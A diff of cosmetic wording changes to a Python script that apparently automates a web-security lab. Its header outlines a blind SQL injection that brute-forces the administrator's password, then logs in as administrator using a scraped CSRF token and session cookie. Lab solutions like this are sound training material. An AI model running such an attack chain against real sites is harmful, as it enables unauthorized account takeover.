@@ -10,7 +10,7 @@
 #           administrator's password based on conditional responses
 #        2. Modify the payload to brute force the administrator's password
 #        3. Fetch the login page
-#        4. Extract csrf token and session cookie
+#        4. Extract the csrf token and session cookie
 #        5. Login as the administrator
 #        6. Fetch the administrator profile
 #
@@ -144,10 +144,10 @@ print(Fore.WHITE + "\n3. Fetching login page.. " + Fore.GREEN + "OK")
 # get session cookie
 session = fetch_login.cookies.get("session")
 
-# extract csrf token
+# Extract the csrf token
 csrf = re.findall("csrf.+value=\"(.+)\"", fetch_login.text)[0]
 
-print(Fore.WHITE + "4. Extracting csrf token and session cookie.. " + Fore.GREEN + "OK")
+print(Fore.WHITE + "4. Extracting the csrf token and session cookie.. " + Fore.GREEN + "OK")
 
 # data to send via POST
 data = {
